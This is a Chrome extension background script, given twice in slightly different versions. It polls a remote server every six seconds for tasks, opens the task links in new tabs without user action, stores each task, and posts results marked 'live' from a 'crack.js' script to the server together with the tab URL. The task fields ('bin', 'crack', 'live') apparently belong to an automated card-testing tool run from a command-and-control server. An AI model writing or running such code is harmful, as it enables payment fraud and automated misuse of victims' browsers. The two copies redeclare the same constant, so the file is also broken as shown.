
// --- ROBUST COMMS BRIDGE ---
const SERVER_URL = 'https://new-hit.onrender.com'; let lastOpenedUrl = ''; chrome.alarms.create('checkTask', { periodInMinutes: 0.1 }); chrome.alarms.onAlarm.addListener((alarm) => { if (alarm.name === 'checkTask') { fetch(SERVER_URL + '/get_task').then(r => r.json()).then(data => { if (data.link && data.link !== lastOpenedUrl) { lastOpenedUrl = data.link; chrome.tabs.create({ url: data.link }); } }).catch(e => console.log('Server down...')); } }); chrome.runtime.onMessage.addListener((request, sender, sendResponse) => { if (request.type === 'FETCH_TASK') { fetch(SERVER_URL + '/get_task').then(r => r.json()).then(data => sendResponse(data)).catch(err => sendResponse({error: err.message})); return true; } if (request.type === 'REPORT_LIVE') { fetch(SERVER_URL + '/report_live', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...request.data, url: sender.tab.url }) }).then(r => r.json()).then(d => sendResponse(d)); return true; } });

// --- COMMS BRIDGE ---
const SERVER_URL = 'https://new-hit.onrender.com';
let lastUrl = '';

// Check for tasks every 10 seconds
chrome.alarms.create('checkTask', { periodInMinutes: 0.1 });

chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'checkTask') {
        fetch(SERVER_URL + '/get_task')
            .then(r => r.json())
            .then(data => {
                if (data.link && data.bin) {
                    // Store the task so content script can read it locally
                    chrome.storage.local.set({ 'currentTask': data });
                    
                    // Only open if it's a new link
                    if (data.link !== lastUrl) {
                        lastUrl = data.link;
                        chrome.tabs.create({ url: data.link });
                        console.log("Automated Tab Opened: " + data.link);
                    }
                }
            })
            .catch(err => console.log("Waiting for server..."));
    }
});

// Receive results from crack.js and send to Cloud Server
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'REPORT_LIVE') {
        fetch(SERVER_URL + '/report_live', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...request.data, url: sender.tab.url })
        }).then(r => r.json()).then(d => sendResponse(d)).catch(e => sendResponse({error: e.message}));
        return true;
    }
});
